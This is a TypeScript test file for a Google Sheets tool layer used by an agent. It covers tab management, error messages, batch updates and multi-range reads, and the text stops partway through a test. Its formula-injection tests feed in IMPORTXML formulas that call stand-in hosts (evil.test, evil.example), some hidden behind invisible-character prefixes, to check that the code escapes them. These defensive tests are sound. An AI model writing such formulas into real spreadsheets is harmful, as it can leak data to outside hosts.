import { describe, expect, it } from "vitest";
import { CREATE, MUTATE } from "./annotations.js";
import {
  handleSheets,
  quoteTabForRange,
  sheetsTools,
  tabNameFromRange,
} from "./sheets.js";
import { fakeClient, payload } from "./fake-client.test-helper.js";

describe("tabNameFromRange", () => {
  it.each([
    ["Sheet1!A1:D10", "Sheet1"],
    ["'MCP Inventory'!A1:B1", "MCP Inventory"],
    ["'Bob''s Data'!A1", "Bob's Data"],
    ["A1:Z", undefined],
    ["'Broken!A1", undefined],
  ])("%s → %s", (range, expected) => {
    expect(tabNameFromRange(range)).toBe(expected);
  });
});

describe("quoteTabForRange", () => {
  it("quotes and escapes for A1 use", () => {
    expect(quoteTabForRange("Bob's Data")).toBe("'Bob''s Data'");
  });
});

describe("sheets_add_tab", () => {
  it("requires spreadsheet_id and title", () => {
    const tool = sheetsTools.find((t) => t.name === "sheets_add_tab");
    expect(tool?.inputSchema.required).toEqual(["spreadsheet_id", "title"]);
  });

  it("is a write that destroys nothing, pinned to the exact shape", () => {
    // toEqual, not toMatchObject: an exact-shape assertion is the only place
    // a stray or misspelled annotation key fails. Cross-tool coverage of the
    // creation shape lives in annotations.test.ts; this pins the tool this
    // file is about.
    const tool = sheetsTools.find((t) => t.name === "sheets_add_tab");
    expect(tool?.annotations).toEqual(CREATE("Add spreadsheet tab"));
  });

  it("sheets_create is likewise pinned: creating a file destroys nothing", () => {
    const tool = sheetsTools.find((t) => t.name === "sheets_create");
    expect(tool?.annotations).toEqual(CREATE("Create spreadsheet"));
  });


  it("adds the tab via batchUpdate and returns the reply's sheetId", async () => {
    const { client, calls } = fakeClient([
      {
        data: {
          replies: [
            { addSheet: { properties: { sheetId: 852183133, title: "Inventory" } } },
          ],
        },
      },
    ]);

    const result = await handleSheets(client, "sheets_add_tab", {
      spreadsheet_id: "sheet-1",
      title: "Inventory",
    });

    expect(calls).toHaveLength(1);
    expect(calls[0]).toMatchObject({
      service: "sheets",
      resource: "spreadsheets",
      method: "batchUpdate",
      params: { spreadsheetId: "sheet-1" },
      jsonBody: { requests: [{ addSheet: { properties: { title: "Inventory" } } }] },
    });
    expect(payload(result)).toEqual({
      sheetId: 852183133,
      title: "Inventory",
    });
  });

  it("writes headers to row 1 of the new tab, range-quoted and RAW", async () => {
    const { client, calls } = fakeClient([
      { data: { replies: [{ addSheet: { properties: { sheetId: 7, title: "Q3 Data" } } }] } },
      { data: {} },
    ]);

    await handleSheets(client, "sheets_add_tab", {
      spreadsheet_id: "sheet-1",
      title: "Q3 Data",
      headers: ["Name", "Owner"],
    });

    expect(calls).toHaveLength(2);
    // RAW: headers are labels; "=Total" must land as text, not a formula.
    expect(calls[1]).toMatchObject({
      resource: "spreadsheets.values",
      method: "update",
      params: { range: "'Q3 Data'!A1", valueInputOption: "RAW" },
      jsonBody: { values: [["Name", "Owner"]] },
    });
  });
});

describe("missing-tab error context", () => {
  const parseFailure =
    'API error: {"error":{"code":400,"message":"Unable to parse range: MCP Inventory!A1:B1","status":"INVALID_ARGUMENT"}}';
  const twoTabs = {
    data: { sheets: [{ properties: { title: "Sheet1" } }, { properties: { title: "Notes" } }] },
  };

  it("names the missing tab and lists the ones that exist", async () => {
    const { client } = fakeClient([{ throws: parseFailure }, twoTabs]);

    await expect(
      handleSheets(client, "sheets_update", {
        spreadsheet_id: "sheet-1",
        range: "MCP Inventory!A1:B1",
        values: [["a", "b"]],
      })
    ).rejects.toThrow(
      'No sheet named "MCP Inventory" in this spreadsheet. ' +
        'Existing tabs: "Sheet1", "Notes". Create it first with sheets_add_tab.'
    );
  });

  it.each([
    ["sheets_read", { spreadsheet_id: "s", range: "Ghost!A1" }],
    ["sheets_append", { spreadsheet_id: "s", range: "Ghost!A1", values: [["x"]] }],
  ])("enriches %s the same way", async (tool, args) => {
    const { client } = fakeClient([
      { throws: "Unable to parse range: Ghost!A1" },
      { data: { sheets: [{ properties: { title: "Sheet1" } }] } },
    ]);
    await expect(handleSheets(client, tool, { ...args })).rejects.toThrow(
      'No sheet named "Ghost"'
    );
  });

  it("covers sheets_add_tab's own header write through the same seam", async () => {
    const { client } = fakeClient([
      { data: { replies: [{ addSheet: { properties: { sheetId: 7, title: "Ghost" } } }] } },
      { throws: "Unable to parse range: 'Ghost'!A1" },
      { data: { sheets: [{ properties: { title: "Sheet1" } }] } },
    ]);

    await expect(
      handleSheets(client, "sheets_add_tab", {
        spreadsheet_id: "s",
        title: "Ghost",
        headers: ["a"],
      })
    ).rejects.toThrow('No sheet named "Ghost"');
  });

  it.each([
    [
      "the named tab actually exists",
      [
        { throws: parseFailure },
        { data: { sheets: [{ properties: { title: "MCP Inventory" } }] } },
      ],
      { spreadsheet_id: "s", range: "MCP Inventory!A1:B1", values: [["a"]] },
      2,
    ],
    [
      "the range has no tab prefix",
      [{ throws: "Unable to parse range: A1:ZZZ99" }],
      { spreadsheet_id: "s", range: "A1:ZZZ99", values: [["a"]] },
      1,
    ],
    [
      "the tab lookup itself fails",
      [{ throws: parseFailure }, { throws: "API error: permission denied" }],
      { spreadsheet_id: "s", range: "MCP Inventory!A1", values: [["a"]] },
      2,
    ],
  ] as const)(
    "keeps the original error when %s",
    async (_case, plan, args, expectedCalls) => {
      const { client, calls } = fakeClient([...plan]);
      await expect(handleSheets(client, "sheets_update", { ...args })).rejects.toThrow(
        "Unable to parse range"
      );
      expect(calls).toHaveLength(expectedCalls);
    }
  );

  it("leaves unrelated errors untouched, without a tab lookup", async () => {
    const { client, calls } = fakeClient([
      { throws: "API error: rate limit exceeded" },
    ]);

    await expect(
      handleSheets(client, "sheets_read", { spreadsheet_id: "s", range: "Sheet1!A1" })
    ).rejects.toThrow("rate limit exceeded");
    expect(calls).toHaveLength(1);
  });
});

describe("tab lifecycle", () => {
  const twoTabs = {
    data: {
      sheets: [
        { properties: { sheetId: 0, title: "Sheet1" } },
        { properties: { sheetId: 852183133, title: "Inventory" } },
      ],
    },
  };

  it("renames by title, resolving the sheetId itself", async () => {
    const { client, calls } = fakeClient([twoTabs, { data: {} }]);

    const result = await handleSheets(client, "sheets_rename_tab", {
      spreadsheet_id: "s",
      title: "Inventory",
      new_title: "Vendors",
    });

    expect(calls[1]).toMatchObject({
      method: "batchUpdate",
      jsonBody: {
        requests: [
          {
            updateSheetProperties: {
              properties: { sheetId: 852183133, title: "Vendors" },
              fields: "title",
            },
          },
        ],
      },
    });
    expect(payload(result)).toEqual({
      sheetId: 852183133,
      title: "Vendors",
      previousTitle: "Inventory",
    });
  });

  it("deletes a tab by title", async () => {
    const { client, calls } = fakeClient([twoTabs, { data: {} }]);

    await handleSheets(client, "sheets_delete_tab", {
      spreadsheet_id: "s",
      title: "Inventory",
    });

    expect(calls[1]).toMatchObject({
      method: "batchUpdate",
      jsonBody: { requests: [{ deleteSheet: { sheetId: 852183133 } }] },
    });
  });

  it.each(["sheets_rename_tab", "sheets_delete_tab"])(
    "%s names the real tabs when the title does not exist",
    async (tool) => {
      const { client } = fakeClient([twoTabs]);
      await expect(
        handleSheets(client, tool, {
          spreadsheet_id: "s",
          title: "Ghost",
          new_title: "x",
        })
      ).rejects.toThrow(
        'No sheet named "Ghost" in this spreadsheet. Existing tabs: "Sheet1", "Inventory".'
      );
    }
  );

  it("clears values without touching the tab", async () => {
    const { client, calls } = fakeClient([
      { data: { clearedRange: "Inventory!A1:D50" } },
    ]);

    const result = await handleSheets(client, "sheets_clear", {
      spreadsheet_id: "s",
      range: "Inventory",
    });

    expect(calls[0]).toMatchObject({
      resource: "spreadsheets.values",
      method: "clear",
      params: { range: "Inventory" },
    });
    expect(payload(result)).toEqual({
      clearedRange: "Inventory!A1:D50",
    });
  });

  it("titles the destructive tab tool so a prompt cannot be misread", () => {
    // Read alone in a confirmation dialog by someone who thinks they are
    // closing a view, this has to say that rows are going away.
    const del = sheetsTools.find((t) => t.name === "sheets_delete_tab");
    expect(del?.annotations).toEqual(
      MUTATE("Delete a spreadsheet tab and all its rows")
    );
    // Its non-destructive neighbour, so clearing is the obvious choice for
    // "empty this" rather than deleting the tab.
    const clear = sheetsTools.find((t) => t.name === "sheets_clear");
    expect(clear?.annotations).toEqual(
      MUTATE("Erase the values in a spreadsheet range")
    );
    const rename = sheetsTools.find((t) => t.name === "sheets_rename_tab");
    expect(rename?.annotations).toEqual(CREATE("Rename a spreadsheet tab"));
  });
});

/** An agent writing to a sheet is usually writing text it read somewhere the
 * sheet's owner does not control. Sheets formulas reach the network, so a
 * leading `=` turns "log this in my tracker" into an exfiltration primitive. */
describe("formula injection guard", () => {
  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "Sheet1!A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s escapes values that would execute", async (tool, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, tool, {
      ...base,
      values: [["=IMPORTXML(\"https://evil.test\",\"//a\")", "+1+1"]],
    });

    // Sheets strips the leading apostrophe on read, so the stored value is
    // the original string — the caller sees no difference, the formula never
    // runs. Measured: `=` and `+` execute; `-`, `@` and a leading space do not.
    expect(calls[0].jsonBody).toEqual({
      values: [["'=IMPORTXML(\"https://evil.test\",\"//a\")", "'+1+1"]],
    });
  });

  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "Sheet1!A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s leaves harmless values untouched", async (tool, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, tool, {
      ...base,
      values: [["-1-1", "@SUM(1,2)", "2026-08-05", "5", ""]],
    });

    expect(calls[0].jsonBody).toEqual({
      values: [["-1-1", "@SUM(1,2)", "2026-08-05", "5", ""]],
    });
  });

  it("still writes USER_ENTERED, so numbers stay numbers", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, "sheets_append", {
      spreadsheet_id: "s",
      values: [["5", "10"]],
    });

    // RAW would neutralise the same attack, but silently: =SUM() over
    // RAW-written numbers returns 0, not the total and not an error.
    expect(calls[0].params).toMatchObject({ valueInputOption: "USER_ENTERED" });
  });

  it("writes a real formula when the caller explicitly asks for one", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, "sheets_update", {
      spreadsheet_id: "s",
      range: "Sheet1!C1",
      values: [["=SUM(A1:B1)"]],
      parse_formulas: true,
    });

    expect(calls[0].jsonBody).toEqual({ values: [["=SUM(A1:B1)"]] });
  });

  it("offers the opt-out on both writing tools", () => {
    // A guard with no documented way past it gets worked around with gws_run,
    // which has no guard at all.
    for (const name of ["sheets_update", "sheets_append"]) {
      const tool = sheetsTools.find((t) => t.name === name);
      expect(tool?.inputSchema.properties).toHaveProperty("parse_formulas");
    }
  });
});

/** The raw-first-character version of this guard let invisible-prefixed
 * payloads through. A plain leading space was measured inert in Sheets; BOM
 * was NOT, and BOM is a format character rather than whitespace, which is the
 * evidence that Sheets skips leading zero-width characters before parsing.
 *
 * The zero-width cases below were not measured against the live API. They are
 * covered because the escape is lossless: guessing wide costs an apostrophe
 * Sheets strips on read, guessing narrow costs an injection. */
describe("formula guard ignores leading invisible characters", () => {
  it.each([
    ["tab", "\t=IMPORTXML(\"https://evil.test\",\"//a\")"],
    ["newline", "\n=1+1"],
    ["zwsp", "​=IMPORTXML(\"https://evil.test\",\"//a\")"],
    ["zwnj", "‌=1+1"],
    ["word joiner", "⁠=1+1"],
    ["soft hyphen", "­=1+1"],
    ["bidi mark", "‎=1+1"],
    ["nbsp", " =1+1"],
    ["bom", "﻿=1+1"],
    ["plain space", " +1+1"],
  ])("escapes a %s-prefixed formula", async (_label, payload) => {
    const { client, calls } = fakeClient([{ data: {} }]);
    await handleSheets(client, "sheets_append", {
      spreadsheet_id: "s",
      values: [[payload]],
    });
    expect((calls[0].jsonBody as { values: string[][] }).values[0][0]).toBe(
      `'${payload}`
    );
  });

  it("does not escape whitespace-only or ordinary text", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);
    await handleSheets(client, "sheets_append", {
      spreadsheet_id: "s",
      values: [["   ", "  hello", "-1-1", ""]],
    });
    expect(calls[0].jsonBody).toEqual({
      values: [["   ", "  hello", "-1-1", ""]],
    });
  });
});

/**
 * THE PIN. SCRUM-46 fixed caller text being evaluated as a formula; SCRUM-121
 * asked to make the write mode selectable, and the obvious way to do that is
 * to hand the default to whoever is next in a hurry.
 *
 * These assert the PROPERTY — a formula-prefixed value supplied by the caller
 * is not evaluated unless the caller asked for it — rather than the mechanism
 * that currently delivers it. That distinction is deliberate. The property is
 * what SCRUM-46 bought and it must survive any future change of mechanism,
 * whether that is the apostrophe escape shipped in fc0ce41, a switch to RAW,
 * or an explicit value_input_option. A test pinned to `valueInputOption ===
 * "USER_ENTERED"` alone would pass a refactor that kept the constant and
 * dropped the guard, which is exactly the regression worth catching.
 */
describe("PIN: the default write path never evaluates caller text", () => {
  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s leaves a formula inert by default", async (toolName, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, toolName, {
      ...base,
      values: [["=IMPORTXML(\"https://evil.example\",\"//x\")", "+1+1"]],
    });

    const sent = (calls[0].jsonBody as { values: string[][] }).values[0];
    const mode = (calls[0].params as { valueInputOption?: string }).valueInputOption;

    // Whatever the mechanism, one of these two must hold for every value the
    // caller supplied: it is stored literally (RAW), or it is neutralised
    // before it is sent (the apostrophe escape).
    for (const value of sent) {
      const inert = mode === "RAW" || value.startsWith("'");
      expect(
        inert,
        `"${value}" would be evaluated: valueInputOption=${mode} and the value is unescaped`
      ).toBe(true);
    }
  });

  it("evaluates a formula only when the caller names the opt-out", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, "sheets_update", {
      spreadsheet_id: "s",
      range: "A1",
      values: [["=1+1"]],
      parse_formulas: true,
    });

    // The opt-out has to actually reach Google in an evaluating mode,
    // otherwise "you can write a formula" is a claim the tool cannot honour.
    expect(calls[0].params).toMatchObject({ valueInputOption: "USER_ENTERED" });
    expect(calls[0].jsonBody).toEqual({ values: [["=1+1"]] });
  });
});

describe("value_input_option (SCRUM-121)", () => {
  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s: naming USER_ENTERED is not an opt-out of the escape", async (tool, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, tool, {
      ...base,
      values: [["=1+1", "5"]],
      value_input_option: "USER_ENTERED",
    });

    // The default is ESCAPED USER_ENTERED whether the caller writes the word
    // or not. parse_formulas is the only door to evaluation.
    expect(calls[0].params).toMatchObject({ valueInputOption: "USER_ENTERED" });
    expect(calls[0].jsonBody).toEqual({ values: [["'=1+1", "5"]] });
  });

  it.each([
    ["sheets_update", { spreadsheet_id: "s", range: "A1" }],
    ["sheets_append", { spreadsheet_id: "s" }],
  ])("%s: RAW passes values through verbatim, unescaped", async (tool, base) => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await handleSheets(client, tool, {
      ...base,
      values: [["=1+1", "5"]],
      value_input_option: "RAW",
    });

    // RAW stores exactly what it is sent: escaping here would embed the
    // apostrophe as a permanent literal character, and RAW never evaluates
    // anything anyway, so the value is already inert.
    expect(calls[0].params).toMatchObject({ valueInputOption: "RAW" });
    expect(calls[0].jsonBody).toEqual({ values: [["=1+1", "5"]] });
  });

  it("rejects RAW combined with parse_formulas instead of silently storing text", async () => {
    const { client, calls } = fakeClient([{ data: {} }]);

    await expect(
      handleSheets(client, "sheets_update", {
        spreadsheet_id: "s",
        range: "A1",
        values: [["=SUM(A1:B1)"]],
        value_input_option: "RAW",
        parse_formulas: true,
      })
    ).rejects.toThrow(/RAW never evaluates/);

    // Failing loudly is the point: honouring both would write formula text
    // that never runs while the call reports success.
    expect(calls).toHaveLength(0);
  });

  it("offers the option on both writing tools, enum-bound for the boundary check", () => {
    for (const name of ["sheets_update", "sheets_append"]) {
      const tool = sheetsTools.find((t) => t.name === name);
      const prop = (
        tool?.inputSchema.properties as Record<
          string,
          { enum?: string[] } | undefined
        >
      ).value_input_option;
      expect(prop?.enum).toEqual(["USER_ENTERED", "RAW"]);
    }
  });
});

describe("sheets_read value_render_option", () => {
  it("omits the parameter entirely when the caller does not set it", async () => {
    const { client, calls } = fakeClient([{ data: { values: [["a"]] } }]);
    await handleSheets(client, "sheets_read", { spreadsheet_id: "s", range: "A1" });
    expect(calls[0].params).not.toHaveProperty("valueRenderOption");
  });

  it.each(["FORMATTED_VALUE", "UNFORMATTED_VALUE", "FORMULA"])(
    "passes %s through to the API",
    async (option) => {
      const { client, calls } = fakeClient([{ data: { values: [["a"]] } }]);
      await handleSheets(client, "sheets_read", {
        spreadsheet_id: "s",
        range: "A1",
        value_render_option: option,
      });
      expect(calls[0].params).toMatchObject({ valueRenderOption: option });
    }
  );

  it("offers FORMULA, which is what makes a write verifiable", () => {
    // Without this, a caller cannot tell a live formula from text that looks
    // like one — which is how SCRUM-121 item 1 came to be filed backwards.
    const read = sheetsTools.find((t) => t.name === "sheets_read");
    const option = read?.inputSchema.properties.value_render_option as {
      enum?: string[];
    };
    expect(option?.enum).toContain("FORMULA");
  });
});

describe("sheets_batch_update", () => {
  it("passes the requests straight through to the Sheets batchUpdate endpoint", async () => {
    const { client, calls } = fakeClient([{ data: { replies: [{}, {}] } }]);
    const requests = [
      {
        updateSheetProperties: {
          properties: { sheetId: 852183133, gridProperties: { frozenRowCount: 1 } },
          fields: "gridProperties.frozenRowCount",
        },
      },
      {
        repeatCell: {
          range: { sheetId: 852183133, startRowIndex: 0, endRowIndex: 1 },
          cell: { userEnteredFormat: { textFormat: { bold: true } } },
          fields: "userEnteredFormat(textFormat(bold))",
        },
      },
    ];

    const result = await handleSheets(client, "sheets_batch_update", {
      spreadsheet_id: "sheet-1",
      requests,
    });

    expect(calls).toHaveLength(1);
    expect(calls[0]).toMatchObject({
      service: "sheets",
      resource: "spreadsheets",
      method: "batchUpdate",
      params: { spreadsheetId: "sheet-1" },
      jsonBody: { requests },
    });
    // The replies are returned verbatim. Empty reply objects are NORMAL for
    // formatting requests and mean accepted, not applied — a caller has to be
    // able to see that for itself rather than be told a summary.
    expect(payload(result)).toEqual({ replies: [{}, {}] });
  });

  it("does not curate the request types, so an unfamiliar one still goes through", async () => {
    // docs_batch_update documents three request types and passes everything,
    // and that turned out to be right: a curated allowlist becomes a second
    // place for Google's API surface to drift from ours.
    const { client, calls } = fakeClient([{ data: { replies: [{}] } }]);
    const exotic = [{ addBanding: { bandedRange: { range: { sheetId: 7 } } } }];

    await handleSheets(client, "sheets_batch_update", {
      spreadsheet_id: "sheet-1",
      requests: exotic,
    });

    expect((calls[0] as { jsonBody: { requests: unknown } }).jsonBody.requests).toEqual(exotic);
  });

  it("makes exactly ONE call and never retries or splits a rejected batch", async () => {
    // The Sheets batchUpdate is ATOMIC: a batch that fails on one request
    // applies none of the others. Callers depend on there being no partial
    // state, so a wrapper that retried the good half would be a correctness
    // bug wearing a resilience costume. If anyone adds a retry, this reddens.
    const rejection =
      'API error: {"error":{"code":400,"message":"Invalid requests[6].mergeCells: ' +
      "You can't merge frozen and non-frozen columns.\",\"status\":\"INVALID_ARGUMENT\"}}";
    const { client, calls } = fakeClient([{ throws: rejection }]);

    await expect(
      handleSheets(client, "sheets_batch_update", {
        spreadsheet_id: "sheet-1",
        requests: [{ mergeCells: {} }],
      })
    ).rejects.toThrow(
      // The request INDEX is the thing that tells you which request was wrong,
      // so the message reaches the caller unrewritten.
      /Invalid requests\[6\]\.mergeCells/
    );
    expect(calls).toHaveLength(1);
  });

  it("is pinned to the mutating annotation shape", () => {
    const tool = sheetsTools.find((t) => t.name === "sheets_batch_update");
    expect(tool?.annotations).toEqual(MUTATE("Apply a batch of changes to a spreadsheet"));
    expect(tool?.inputSchema.required).toEqual(["spreadsheet_id", "requests"]);
  });
});

/* SCRUM-246: several ranges in ONE request. The transport cannot carry an
 * array-valued query parameter, so values.batchGet (ranges=...) is out of
 * reach; values.batchGetByDataFilter takes the ranges in a JSON body and
 * answers with one value range per filter, in order. A caller who needs the
 * header row and a data block, or three tabs, pays one round trip. */
describe("sheets_read with ranges[] (SCRUM-246)", () => {
  it("issues ONE batchGetByDataFilter with the ranges in order and returns one block per range in order", async () => {
    const { client, calls } = fakeClient([
      {
        data: {
          spreadsheetId: "s",
          valueRanges: [
            { valueRange: { range: "Sheet1!A1:B1", values: [["h1", "h2"]] } },
            { valueRange: { range: "Sheet1!A2:B3", values: [["1"], ["2", "x"]] } },
            { valueRange: { range: "Other!A1:A2" } },
          ],
        },
      },
    ]);
    const result = payload(
      await handleSheets(client, "sheets_read", {
        spreadsheet_id: "s",
        ranges: ["Sheet1!A1:B1", "Sheet1!A2:B3", "Other!A1:A2"],
        value_render_option: "UNFORMATTED_VALUE",
      })
    );
    expect(calls).toHaveLength(1);
    expect(calls[0]).toMatchObject({
      service: "sheets",
      resource: "spreadsheets.values",
      method: "batchGetByDataFilter",
      params: { spreadsheetId: "s" },
      jsonBody: {
        dataFilters: [{ a1Range: "Sheet1!A1:B1" }, { a1Range: "Sheet1!A2:B3" }, { a1Range: "Other!A1:A2" }],
        valueRenderOption: "UNFORMATTED_VALUE",
      },
    });
    expect(result.blocks).toHaveLength(3);
    expect(result.blocks[0]).toEqual({ range: "Sheet1!A1:B1", rowCount: 1, columnCount: 2, values: [["h1", "h2"]] });
    // Ragged rows are padded the same way the single-range read pads them.
    expect(result.blocks[1]).toEqual({ range: "Sheet1!A2:B3", rowCount: 2, columnCount: 2, values: [["1", ""], ["2", "x"]] });
    // An empty range is an empty block, still in its place.
    expect(result.blocks[2]).toEqual({ range: "Other!A1:A2", rowCount: 0, columnCount: 0, values: [] });
  });

  it("omits valueRenderOption from the body when the caller did not set it", async () => {
    const { client, calls } = fakeClient([{ data: { valueRanges: [{ valueRange: { range: "A1", values: [["a"]] } }] } }]);
    await handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges: ["A1"] });
    expect((calls[0].jsonBody as Record<string, unknown>)).not.toHaveProperty("valueRenderOption");
  });

  it("keeps the single range path exactly as it was: values.get, no body", async () => {
    const { client, calls } = fakeClient([{ data: { range: "A1", values: [["a"]] } }]);
    const result = payload(await handleSheets(client, "sheets_read", { spreadsheet_id: "s", range: "A1" }));
    expect(calls[0]).toMatchObject({ resource: "spreadsheets.values", method: "get", params: { spreadsheetId: "s", range: "A1" } });
    expect(calls[0]).not.toHaveProperty("jsonBody");
    expect(result).toEqual({ range: "A1", rowCount: 1, columnCount: 1, values: [["a"]] });
  });

  it("refuses a call with neither range nor ranges, and one with both, naming the fields", async () => {
    const { client, calls } = fakeClient([]);
    await expect(handleSheets(client, "sheets_read", { spreadsheet_id: "s" })).rejects.toThrow(/range.*ranges|ranges.*range/);
    await expect(
      handleSheets(client, "sheets_read", { spreadsheet_id: "s", range: "A1", ranges: ["A1"] })
    ).rejects.toThrow(/one of/);
    await expect(handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges: [] })).rejects.toThrow(/at least one/);
    expect(calls).toHaveLength(0);
  });

  it("explains a missing tab for a ranged read the same way it does for a single range", async () => {
    const { client } = fakeClient([
      { throws: "Unable to parse range: Ghost!A1:B2" },
      { data: { sheets: [{ properties: { title: "Sheet1" } }] } },
    ]);
    await expect(
      handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges: ["Ghost!A1:B2", "Sheet1!A1"] })
    ).rejects.toThrow(/Ghost/);
  });

  it("describes ranges[] and keeps range, so a model can pick either", () => {
    const read = sheetsTools.find((t) => t.name === "sheets_read")!;
    const props = read.inputSchema.properties as Record<string, { type?: string; description?: string; items?: unknown }>;
    expect(props.range?.type).toBe("string");
    expect(props.ranges?.type).toBe("array");
    expect(props.ranges?.description).toMatch(/one request/i);
    expect(read.inputSchema.required).toEqual(["spreadsheet_id"]);
    expect(read.description).toMatch(/ranges/);
    expect(read.description).not.toContain("\u2014");
  });
});

/* SCRUM-253: the blocks come back in the order the ranges were given, no
 * matter how the API orders its answer. values.batchGetByDataFilter returns
 * one matched value range per filter but does not promise the request order
 * (values.batchGet does; it is out of reach, see SCRUM-246), and the first
 * two real calls after 246 shipped proved it: three ranges of different
 * sizes came back sorted by something other than the request. Each answer
 * echoes the filter it matched, and that echo is what places the block. */
describe("sheets_read ranges[] keeps the request order (SCRUM-253)", () => {
  const REQUEST = ["Inventory!A1:A1", "Inventory!A150:A200", "Inventory!J1:J1"];

  it("places three ranges of different sizes by the filter each answer echoes, not by arrival", async () => {
    const { client } = fakeClient([
      {
        data: {
          valueRanges: [
            { dataFilters: [{ a1Range: "Inventory!A1:A1" }], valueRange: { range: "Inventory!A1", values: [["sku"]] } },
            { dataFilters: [{ a1Range: "Inventory!J1:J1" }], valueRange: { range: "Inventory!J1", values: [["qty"]] } },
            {
              dataFilters: [{ a1Range: "Inventory!A150:A200" }],
              valueRange: { range: "Inventory!A150:A200", values: [["r-1"], ["r-2"], ["r-3"]] },
            },
          ],
        },
      },
    ]);
    const result = payload(
      await handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges: REQUEST })
    );
    expect(result.blocks.map((b: { range: string }) => b.range)).toEqual([
      "Inventory!A1",
      "Inventory!A150:A200",
      "Inventory!J1",
    ]);
    expect(result.blocks[0].values).toEqual([["sku"]]);
    expect(result.blocks[1].rowCount).toBe(3);
    expect(result.blocks[2].values).toEqual([["qty"]]);
  });

  it("falls back to the echoed range when an answer carries no filter, and then to position", async () => {
    const { client } = fakeClient([
      {
        data: {
          valueRanges: [
            { valueRange: { range: "Inventory!J1", values: [["qty"]] } },
            { valueRange: { range: "Inventory!A1", values: [["sku"]] } },
            { valueRange: { range: "Inventory!A150:A200", values: [["r-1"]] } },
          ],
        },
      },
    ]);
    const result = payload(
      await handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges: REQUEST })
    );
    // "Inventory!J1" is the API's spelling of "Inventory!J1:J1": a single cell
    // echoes without the repeated corner, so the match is on the cells
    // named, not the text.
    expect(result.blocks.map((b: { range: string }) => b.range)).toEqual([
      "Inventory!A1",
      "Inventory!A150:A200",
      "Inventory!J1",
    ]);
  });

  it("gives a range the API did not answer an empty block in its place", async () => {
    const { client } = fakeClient([
      {
        data: {
          valueRanges: [
            { dataFilters: [{ a1Range: "Inventory!J1:J1" }], valueRange: { range: "Inventory!J1", values: [["qty"]] } },
            { dataFilters: [{ a1Range: "Inventory!A1:A1" }], valueRange: { range: "Inventory!A1", values: [["sku"]] } },
          ],
        },
      },
    ]);
    const result = payload(
      await handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges: REQUEST })
    );
    expect(result.blocks).toHaveLength(3);
    expect(result.blocks[1]).toEqual({ range: "Inventory!A150:A200", rowCount: 0, columnCount: 0, values: [] });
    expect(result.blocks[2].values).toEqual([["qty"]]);
  });
});

/* SCRUM-297: a range asked for twice gets its data twice. Measured against
 * the live API: values.batchGetByDataFilter sent three filters, two of them
 * identical, answers with TWO matched value ranges, and the merged one lists
 * both filters it matched. One answer cannot fill two slots by placement
 * alone, so the second slot used to come back as an empty block, the same
 * shape as a range nothing answered. */
describe("sheets_read ranges[] answers a repeated range every time (SCRUM-297)", () => {
  const A = { range: "Inventory!A1:B2", values: [["sku", "qty"], ["a-1", "4"]] };
  const B = { range: "Inventory!D1", values: [["total"]] };
  const read = async (ranges: string[], valueRanges: unknown[]) => {
    const { client } = fakeClient([{ data: { valueRanges } }]);
    return payload(await handleSheets(client, "sheets_read", { spreadsheet_id: "s", ranges })).blocks;
  };

  it("[A, B, A] with one answer per distinct range: slots 0 and 2 are equal, slot 1 is B", async () => {
    const blocks = await read(
      ["Inventory!A1:B2", "Inventory!D1", "Inventory!A1:B2"],
      [
        // The measured shape: the merged answer echoes the filter twice.
        { dataFilters: [{ a1Range: "Inventory!A1:B2" }, { a1Range: "Inventory!A1:B2" }], valueRange: A },
        { dataFilters: [{ a1Range: "Inventory!D1" }], valueRange: B },
      ]
    );
    expect(blocks).toHaveLength(3);
    expect(blocks[0].values).toEqual(A.values);
    expect(blocks[2]).toEqual(blocks[0]);
    expect(blocks[1]).toEqual({ range: "Inventory!D1", rowCount: 1, columnCount: 1, values: [["total"]] });
  });

  it("[A, A] answered once: two equal blocks", async () => {
    const blocks = await read(
      ["Inventory!A1:B2", "Inventory!A1:B2"],
      [{ dataFilters: [{ a1Range: "Inventory!A1:B2" }, { a1Range: "Inventory!A1:B2" }], valueRange: A }]
    );
    expect(blocks).toHaveLength(2);
    expect(blocks[0].rowCount).toBe(2);
    expect(blocks[1]).toEqual(blocks[0]);
  });

  it("[A, B] where nothing answers B: slot 1 stays empty, it does not borrow A", async () => {
    const blocks = await read(
      ["Inventory!A1:B2", "Inventory!D1"],
      [{ dataFilters: [{ a1Range: "Inventory!A1:B2" }], valueRange: A }]
    );
    expect(blocks[0].values).toEqual(A.values);
    expect(blocks[1]).toEqual({ range: "Inventory!D1", rowCount: 0, columnCount: 0, values: [] });
  });

  it("two spellings of the same cells are the same range: quoted tab, letter case, repeated corner", async () => {
    const blocks = await read(
      ["Inventory!A1:B2", "'Inventory'!A1:B2", "inventory!a1:b2", "Inventory!D1:D1"],
      [
        { dataFilters: [{ a1Range: "Inventory!A1:B2" }], valueRange: A },
        { dataFilters: [{ a1Range: "Inventory!D1:D1" }], valueRange: B },
      ]
    );
    expect(blocks[1]).toEqual(blocks[0]);
    expect(blocks[2]).toEqual(blocks[0]);
    expect(blocks[3].values).toEqual([["total"]]);
  });

  it("a repeated range is filled before the positional last resort, so an answer with no echo cannot take its slot", async () => {
    const blocks = await read(
